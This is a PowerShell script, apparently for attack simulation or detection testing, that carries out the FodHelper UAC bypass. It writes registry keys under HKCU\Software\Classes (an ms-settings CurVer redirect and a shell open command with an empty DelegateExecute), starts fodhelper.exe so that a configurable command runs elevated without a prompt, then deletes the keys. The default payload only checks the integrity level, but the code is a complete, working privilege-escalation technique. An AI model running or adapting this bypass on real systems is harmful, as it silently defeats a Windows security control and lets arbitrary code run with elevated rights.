<#
.SYNOPSIS
The script simulate user account control bypass by abusing auto elevated process which reads execution parameters from registry.

.DESCRIPTION
Abuses FodHelper auto elevated windows process to execute cmd.exe
 
.EXAMPLE
Invoke-FodHelper 
 
Description
-----------
Executes FodHelper UAC Bypass
#>
function Invoke-FodHelper {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= 'cmd.exe /c whoami /groups | find "S-1-16-12288" && Echo I am running elevated, so I must be an admin anyway ;-) || Echo I am not running elevanted :-('
    )
    Begin {
		$me = whoami.exe
		$adminNames = Get-LocalGroupMember -Group 'Administrators' | Select-Object -ExpandProperty name
        $isAdmin = $adminNames -Contains $me
    }

    Process {
		if( $isAdmin )
		{
			New-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Force
			Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".bla" -Force
			New-Item "HKCU:\Software\Classes\.bla\Shell\Open\command" -Force
			New-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
			Set-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "(default)" -Value $program -Force
			Start-Sleep -s 1
			Start-Process "C:\Windows\System32\fodhelper.exe"
			Start-Sleep -s 1
			Remove-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Recurse -Force
			Remove-Item "HKCU:\Software\Classes\.bla\" -Recurse -Force
		}else
		{
			Add-Type -AssemblyName PresentationFramework;
			[System.Windows.MessageBox]::Show('You have to be Administrator');	
		}
    }

}
